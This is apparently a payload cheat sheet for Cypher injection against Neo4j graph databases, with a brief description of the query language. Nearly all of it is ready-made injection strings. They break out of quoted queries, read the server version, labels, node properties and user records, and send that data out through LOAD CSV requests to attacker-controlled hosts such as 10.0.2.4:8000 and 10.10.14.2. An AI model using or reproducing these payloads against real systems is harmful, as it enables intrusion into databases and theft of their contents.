# Description

Cypher is Neo4j's graph query language that lets you retrieve data from the graph. It uses “an ASCII-art type of syntax,” in which rounded brackets are used to represent nodes and square brackets represent relationships. If that sounds familiar, it's inspired by SQL (according to Neo4j).

# Injection Payloads

## Server version:

```
' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.0.2.4:8000/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 //
```

## Labels (like columns)

```
'}) RETURN 0 as _0 UNION CALL db.labels() yield label LOAD CSV FROM 'http://attacker_ip /?l='+label as l RETURN 0 as _0
```

## Get information from labels (data)

```
' OR 1=1 WITH 1 as a MATCH (f:Flag) UNWIND keys(f) as p LOAD CSV FROM 'http://10.0.2.4:8000/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
```

## With WHERE clause:

```
' OR 1=1 WITH 1 as a MATCH (u:user) WHERE u.id=1 UNWIND keys(u) as p LOAD CSV FROM 'http://10.10.14.2/?' + p +'='+toString(u[p]) as l RETURN 0 as _0 //
